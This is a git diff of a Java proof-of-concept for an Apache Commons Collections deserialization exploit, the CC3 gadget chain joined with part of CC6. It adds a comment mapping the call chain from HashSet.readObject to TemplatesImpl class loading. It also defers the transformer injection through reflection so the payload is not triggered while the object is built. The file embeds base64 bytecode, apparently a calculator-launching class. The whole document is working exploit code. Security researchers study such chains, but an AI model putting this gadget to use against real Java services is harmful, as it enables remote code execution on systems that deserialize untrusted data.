@@ -23,6 +23,22 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
+/*
+* HashSet.readObject()
+*  ->HashMap.readObject()
+*   ->HashMap.hash()
+*    ->TideMapEntry.hashCode()
+*     ->TideMapEntry.getValue()
+*      ->LazyMap.get()
+*       ->ChainedTransformer.transform()
+*        ->InstantiateTransformer.transform()
+*         ->TrAXFilter.TrAXFilter()
+*          ->TemplatesImpl.newTransformer()
+*           ->TemplatesImpl.getTransletInstance()
+*            ->TemplatesImpl.defineTransletClasses()
+*             ->TemplatesImpl$TransletClassLoader.defineClass()
+* */
+
 public class CC3 {
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
@@ -56,6 +72,7 @@ public class CC3 {
         obj.newTransformer();
     }
     public static void main(String[] args) throws Exception {
+        ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{});
         byte[] CalcCode = Base64.getDecoder().decode(
                 "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                         "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
@@ -81,7 +98,6 @@ public class CC3 {
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{calcTemp})
         };
-        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
 
         // CC6前半段,高版本jdk利用
         Map lazyMap = LazyMap.decorate(new HashMap<>(),transformerChain);
@@ -91,6 +107,8 @@ public class CC3 {
         HashSet hashSet = new HashSet(1);
         hashSet.add(tiedMap);
         lazyMap.remove("key");
+
+        setFieldValue(transformerChain,"iTransformers",transformers);
 
         // 测试
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
